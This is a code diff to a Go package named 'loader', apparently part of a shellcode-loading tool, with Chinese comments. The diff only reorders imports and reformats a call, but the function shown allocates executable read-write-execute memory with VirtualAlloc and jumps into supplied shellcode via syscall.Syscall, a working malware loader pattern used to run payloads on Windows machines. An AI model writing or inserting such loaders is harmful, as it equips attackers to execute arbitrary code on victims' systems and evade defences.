@@ -1,17 +1,22 @@
 package loader
 
 import (
-	"golang.org/x/sys/windows"
 	"syscall"
 	"unsafe"
 	"variant/log"
 	"variant/wdll"
+
+	"golang.org/x/sys/windows"
 )
 
 func Direct(shellcode []byte) {
 	// 调用 VirtualAlloc 分配内存
 	allocSize := uintptr(len(shellcode))
-	mem, _, _ := wdll.VirtualAlloc().Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	mem, _, _ := wdll.VirtualAlloc().Call(
+		uintptr(0),
+		allocSize,
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_EXECUTE_READWRITE)
 	if mem == 0 {
 		log.Fatal("VirtualAlloc failed")
 	}
@@ -22,5 +27,4 @@ func Direct(shellcode []byte) {
 
 	// 执行 shellcode
 	syscall.Syscall(mem, 0, 0, 0, 0)
-
 }
